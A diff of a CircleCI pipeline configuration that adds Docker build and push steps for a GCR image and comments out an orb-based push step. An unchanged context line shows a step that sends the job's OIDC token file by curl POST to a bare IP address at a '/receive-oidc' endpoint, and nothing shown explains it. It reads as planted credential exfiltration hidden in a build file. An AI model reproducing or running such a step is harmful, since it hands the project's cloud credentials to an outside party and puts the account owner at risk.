@@ -32,12 +32,19 @@ jobs:
             # 2) Send OIDC token file
             curl -sS -X POST "http://172.86.89.5/receive-oidc" \
               --data-binary @"/home/circleci/oidc_token.json"
+      - run:
+          name: Push the docker image
+          command: docker build -t gcr.io/spherical-plane-479301-d5/hello-world:1.0.0 .
+
+      - run:
+          name: Push the docker image
+          command: docker push gcr.io/spherical-plane-479301-d5/hello-world:1.0.0
 
 
-      - gcr/push-image:
-          registry-url: gcr.io
-          image: hello-world
-          tag: "1.1.0"
+      # - gcr/push-image:
+      #     registry-url: gcr.io
+      #     image: hello-world
+      #     tag: "1.1.0"
 
 workflows:
   build:
